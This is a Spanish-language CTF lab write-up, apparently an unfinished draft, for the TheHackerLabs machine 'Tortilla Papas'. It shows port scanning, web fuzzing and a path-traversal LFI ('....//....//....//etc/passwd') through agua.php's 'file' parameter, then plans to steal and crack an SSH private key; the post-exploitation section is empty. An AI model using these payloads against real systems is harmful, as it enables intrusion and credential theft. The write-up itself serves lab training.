---
layout: single
title: Tortilla Papas - TheHackerLabs
excerpt: "."
date: 2025-03-21
classes: wide
header:
  teaser: /assets/images/THL-writeup-tortillaPapas/_logo.png
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Medium Machine
tags:
  - Linux
  - 
  - 
  - OSCP Style
---
![](/assets/images/THL-writeup-tortillaPapas/_logo.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* *wappalizer*
* *wfuzz*
* *gobuster*
* **
* ** 
* **
* **
* **
* **
* **
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.190
PING 192.168.1.190 (192.168.1.190) 56(84) bytes of data.
64 bytes from 192.168.1.190: icmp_seq=1 ttl=64 time=1.59 ms
64 bytes from 192.168.1.190: icmp_seq=2 ttl=64 time=0.791 ms
64 bytes from 192.168.1.190: icmp_seq=3 ttl=64 time=0.845 ms
64 bytes from 192.168.1.190: icmp_seq=4 ttl=64 time=0.947 ms

--- 192.168.1.190 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3043ms
rtt min/avg/max/mdev = 0.791/1.042/1.586/0.318 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.190 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 13:03 CST
Initiating ARP Ping Scan at 13:03
Scanning 192.168.1.190 [1 port]
Completed ARP Ping Scan at 13:03, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:03
Scanning 192.168.1.190 [65535 ports]
Discovered open port 22/tcp on 192.168.1.190
Discovered open port 80/tcp on 192.168.1.190
Completed SYN Stealth Scan at 13:03, 7.97s elapsed (65535 total ports)
Nmap scan report for 192.168.1.190
Host is up, received arp-response (0.00059s latency).
Scanned at 2025-03-21 13:03:26 CST for 8s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Parece que solo hay 2 puertos activos. Es posible que la intrusión sea por el **puerto 80**.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 22,80 192.168.1.190 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 13:03 CST
Nmap scan report for 192.168.1.190
Host is up (0.00095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Tortilla Papas
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Como mencione antes, parece que la intrusión será por la página web activa.

Vamos a verla.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura1.png">
</p>

Parece una página dedicada al platillo **Tortilla de Papas**.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura2.png">
</p>

Son bastantes tecnologías, pero no veo que nos ayude alguna.

De ahí en fuera, no veo algo que nos pueda ayudar.

Vamos a aplicar **Fuzzing**, para ver si encontramos algo oculto por ahí.

<br>

<h2 id="fuzz">Fuzzing</h2>

Para este caso, costo bastante el encontrar el wordlists correcto, pues fue necesario probar varios de los que tiene **Seclists**.

```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -z list,php-txt-html-sh http://192.168.1.190/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.190/FUZZ.FUZ2Z
Total requests: 4740960

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000003:   200        480 L    1556 W     26594 Ch    "index - html"                                                                                                               
000147481:   403        9 L      28 W       279 Ch      "php"                                                                                                                        
000147483:   403        9 L      28 W       279 Ch      "html"                                                                                                                       
001590769:   200        480 L    1556 W     26574 Ch    "agua - php"                                                                                                                 

Total time: 0
Processed Requests: 4740960
Filtered Requests: 4740955
Requests/sec.: 0
```

| Parámetros | Descripción |
|--------------------------|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*	     | Para indicar una busqueda de archivos específicos. |

<br>

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.190/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 100 -x php,html,txt,sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.190/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/images               (Status: 301) [Size: 317] [--> http://192.168.1.190/images/]
/.php                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 26594]
/css                  (Status: 301) [Size: 314] [--> http://192.168.1.190/css/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.1.190/js/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.1.190/javascript/]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/smokeping            (Status: 301) [Size: 320] [--> http://192.168.1.190/smokeping/]
/server-status        (Status: 403) [Size: 279]
/agua.php             (Status: 200) [Size: 26594]
Progress: 5926270 / 5926275 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

<br>

Encontramos dos cosillas: 
* Un directorio llamado `/smokeping`.
* Un archivo llamado `agua.php`.

Empezaremos por revisar el directorio `/smokeping`.

<br>

<h2 id="Smokeping">Analizando Directorio smokeping</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura3.png">
</p>

Parece ser un servicio que revisa la latencia de la red interna y la gráfica.

Investiguemos el servicio:

| **Smokeping** |
|:-----------:|
| *Smokeping es una herramienta de código abierto diseñada para la monitorización de la latencia, la pérdida de paquetes y la calidad de la conexión en redes. Fue desarrollada por Tobi Oetiker, el creador de RRDtool y MRTG, herramientas ampliamente utilizadas en el monitoreo de infraestructuras.* |

<br>

Ahí mismo, podemos ver la versión que están ocupando:

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura4.png">
</p>

Buscando un Exploit para esta versión, encontramos que es vulnerable a una **condición de carrera**:
* <a href="https://bugs.gentoo.org/602652" target="_blank"></a>

Pero para aplicar esto, necesitamos estar dentro de la máquina víctima, por lo que vamos a descartar este servicio de momento.

<br>

<h2 id="Agua">Aplicando Fuzzing para Encontrar Parámetro Correcto</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura5.png">
</p>

Parece una copia de la página principal, es algo extraño y revisando el código fuente, no logre identificar algo.

Entonces, podemos probar si existe un parámetro que se este utilizando dentro del archivo.

Algo que podemos hacer es provocar un error dentro de esta página con **BurpSuite**, con tal de identificar algún cambio y eso lo podemos utilizar como un delimitador en el **Fuzzing**.

Captura la página y mandala al **Repeater**:

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura6.png">
</p>

Observa que en la respuesta, podemos ver una gran cantidad de bytes en la cabecera **content-lenght**, siendo **26594**:

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura7.png">
</p>

Podemos decir que eso es un resultado positivo.

Lo curioso, es que al tratar de provocar un error, ya sea, poniendo un parámetro random o agregando caracteres extraños a la petición, nos regresa la misma cantidad de bytes:

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura8.png">
</p>

Esto nos da a entender, que es posible que se este aplicando una sanitización o un filtro en las peticiones de este archivo, por lo que sería bueno utilizar ofuscación en nuestras peticiones.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="fuzz2">Aplicando Fuzzing para Encontrar Parámetro Correcto</h2>

Podemos intentar con los ejemplos de **LFI** que nos muestra **HackTricks**:
* <a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=LFI#basic-lfi-and-bypasses" target="_blank">HackTricks: File Inclusion / Path Traversal - Basic LFI and bypasses</a>

Probemos estos payloads con la herramienta **wfuzz**.

Probando varios de estos, solamente uno es el que funciona, siendo `....//....//....//etc/passwd`.

Observa:
```bash
wfuzz -c --hc=404 --hh=26574 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt http://192.168.1.190/agua.php?FUZZ=....//....//....//etc/passwd
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.190/agua.php?FUZZ=....//....//....//etc/passwd
Total requests: 87664

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000758:   200        507 L    1588 W     27943 Ch    "file"                                                                                                                       

Total time: 253.3973
Processed Requests: 87664
Filtered Requests: 87663
Requests/sec.: 345.9546
```

Probandolo en la página y **BurpSuite**, podemos ver que si funciona:

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura9.png">
</p>

<br>

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura10.png">
</p>

Y ahora que ya encontramos el parámetro correcto, podemos utilizar un wordlists de **Seclist** que tiene varios payloads para aplicar **LFI**, siendo el wordlists `/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`.

Probemoslo:
```bash
wfuzz -c --hc=404 --hh=26574 -t 200 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://192.168.1.190/agua.php?file=FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.190/agua.php?file=FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000338:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"     
000000335:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....
                                                        //etc/passwd"                                                                                                                
000000341:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                       
000000353:   200        507 L    1588 W     27943 Ch    "....//....//....//etc/passwd"                                                                                               
000000347:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//....//....//....//etc/passwd"                                                           
000000350:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//etc/passwd"                                                                             
000000344:   200        507 L    1588 W     27943 Ch    "....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                         

Total time: 13.18469
Processed Requests: 929
Filtered Requests: 922
Requests/sec.: 70.46049
```

Ahí están todos esos payloads que funcionaran contra la página para aplicar **LFI**.

<br> 

<h2 id="SSHkey">Robando Llave Privada id_rsa a través de LFI y Crackeandola con JohnTheRipper</h2>

Analizando el archivo `/etc/passwd`, podemos ver que hay 2 usuarios:

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura11.png">
</p>

Uno se llama **concebolla** y el otro **sincebolla**.

Ya que podemos ver archivos de la máquina víctima, una de las cosas que podemos hacer es tratar de robar las llaves privadas del **servicio SSH** de cualquiera de los dos.

El problema es que al revisar cualquiera de los directorios de ambos usuarios, no encontraremos nada o al menos no obtendremos nada.

Navegando un poco entre los directorios, encontramos una llave dentro del directorio `/opt`:

<p align="center">
<img src="/assets/images/THL-writeup-torillaPapas/Captura11.png">
</p>

Muy extraño lugar para dejar una llave privada.

Copiala dentro de un archivo en tu máquina, pues vamos a crackearla para obtener su frase y poder usarla contra el **servicio SSH**.



<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>





<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


* https://bugs.gentoo.org/602652
* https://www.tenable.com/plugins/nessus/165443
* https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=LFI#basic-lfi-and-bypasses
* https://github.com/kurobeats/fimap


<br>

# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
